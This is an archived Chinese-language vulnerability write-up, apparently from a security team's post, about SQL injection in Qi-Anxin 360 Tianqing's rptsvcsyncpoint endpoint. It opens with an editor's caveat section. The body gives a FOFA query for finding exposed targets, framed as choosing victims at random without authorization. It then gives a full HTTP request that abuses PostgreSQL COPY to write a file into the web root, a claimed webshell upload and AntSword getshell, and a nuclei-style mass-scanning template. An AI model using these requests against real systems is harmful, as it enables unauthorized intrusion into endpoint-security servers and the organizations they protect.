---
source: "MrWQ/vulnerability-paper"
id: "vw-bb826c9fb367956e666135a6"
entity_id: "ve-bb826c9fb367956e666135a6"
schema_version: "1"
fofa_unverified: "中搜索以下语法并随机确定要进行攻击测试的目标...."
title: "奇安信 360 天擎 rptsvcsyncpoint SQL 注入漏洞 getshell"
product: "奇安信360天擎"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "DB高权限/Windows固定目录可写，手动含Cookie，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20360%20%E5%A4%A9%E6%93%8E%20rptsvcsyncpoint%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20getshell.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/IYgP_sl4AhsAN0tENOF-nw"
source_status: "recorded"
---

# 奇安信 360 天擎 rptsvcsyncpoint SQL 注入漏洞 getshell

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：奇安信360天擎
- 本文讨论：rptsvcsyncpoint ccid PostgreSQL SQL注入
- 版本、权限与配置前提：DB高权限/Windows固定目录可写，手动含Cookie，版本未知
- 资料类型：SQL写文件复现与检测模板；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- HTTP路径原样含空格需编码，YAML Host含转义花括号可能妨碍模板替换
- PostgreSQL延时检测命名mysql，单次duration&gt;=3无阴性基线
- 随机公网选目标叙述缺授权边界；verified:true不是外部验证
- getshell只有一句声明无对应载荷/结果，FOFA元数据抽成正文句
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 版本、Cookie条件及图示结果待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IYgP_sl4AhsAN0tENOF-nw)

![](../../.resource/remote/6b4e70b9183c28697f241c39f8f680f421719a27c359ccb4843bf1c7294cdec3.png)

![](../../.resource/remote/81cf3f1469a88c77d0f19e4597a9e93ee48390f7c89f4ff0d720271b550cecc0.png)

![](../../.resource/remote/8666f1c503edb7f6a7a29bf86590111be4c4505723aa16d523e23c62431b8cd1.png)

漏洞描述

![](../../.resource/remote/f5353c77d42b71b4550c174abf93ee1b4e1b399ff2c1f7bada97d69bb7b37029.png)

```
360天擎官方版能够为用户精确检测已知病毒木马、未知恶意代码，有效防御APT攻击，360天擎存在SQL注入漏洞。

```

![](../../.resource/remote/81cf3f1469a88c77d0f19e4597a9e93ee48390f7c89f4ff0d720271b550cecc0.png)

![](../../.resource/remote/8666f1c503edb7f6a7a29bf86590111be4c4505723aa16d523e23c62431b8cd1.png)

漏洞复现

![](../../.resource/remote/f5353c77d42b71b4550c174abf93ee1b4e1b399ff2c1f7bada97d69bb7b37029.png)

步骤一：在 Fofa 中搜索以下语法并随机确定要进行攻击测试的目标....

```
#FOFA搜索语法
banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"

```

步骤二：开启代理并打开 BP 对其首页进行抓包拦截.... 修改请求包内容.... 在响应数据包的正文中返回是否成功。

```
GET /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('123456~');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.txt';drop table O;-- HTTP/1.1
Host: ip
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: yourCookie
Connection: close

```

![](../../.resource/remote/0afc79a7d286180ddd054803f7a6871126307cf0d768142216a9b11bf8ee5165.png)

步骤三：访问上传的文件，即可回显写入的文件内容。

![](../../.resource/remote/13c5676b5ad3459345522de7d527ea618774fdb99b87c73dd379d30e334a8922.png)

![](../../.resource/remote/955d407938bb0d1525a6d449668b5d4604ce3f748280e9a8817dad837c49acb0.png)

步骤四：尝试上传 PHP 一句话木马，上传成功，并访问。蚁剑连接，成功 getshell。

![](../../.resource/remote/81cf3f1469a88c77d0f19e4597a9e93ee48390f7c89f4ff0d720271b550cecc0.png)

![](../../.resource/remote/8666f1c503edb7f6a7a29bf86590111be4c4505723aa16d523e23c62431b8cd1.png)

批量脚本

![](../../.resource/remote/f5353c77d42b71b4550c174abf93ee1b4e1b399ff2c1f7bada97d69bb7b37029.png)

```
id: qianxin-360-tianqing-rptsvcsyncpoint-sqli
info:
  name: qianxin-360-tianqing-rptsvcsyncpoint-sqli
  author: xingyun
  severity: high
  tags: qianxin,sqli
  description: 360天擎官方版能够为用户精确检测已知病毒木马、未知恶意代码，有效防御APT攻击，360天擎存在SQL注入漏洞。
  metadata: 
    fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
    verified: true
    max-request: 1
http:
  - raw:
      - |
        @timeout: 50s
        GET /api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(3)-- HTTP/1.1
        Host: \{\{Hostname\}\}
    matchers:     
      - type: dsl
        name: mysql
        dsl:
          - "status_code_1 == 200 && duration>=3 && contains(body,'file_count') && contains(header,'application/json')"

```

揽月安全团队发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！！！！！

  

  

![](../../.resource/remote/a24f4ad6f6ce08ea478e5dbf7ded1edfdf0c9682d39761e1a99d1f67e291134e.jpg)

扫码获取更多精彩

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
